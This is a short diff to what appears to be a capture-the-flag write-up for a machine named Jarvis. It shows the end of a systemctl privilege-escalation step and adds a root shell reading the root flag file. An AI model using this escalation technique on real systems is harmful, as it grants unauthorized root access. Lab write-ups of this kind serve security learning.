@@ -414,7 +414,14 @@ systemctl link $TF
 systemctl enable --now $TF
 
 ```
+#### After executing line by line we have root
 
+```
+root@jarvis:/# cat /root/root.txt
+cat /root/root.txt
+d41d8cd98f00b204e9800998ecf84271
+root@jarvis:/# 
+```
 
 
 
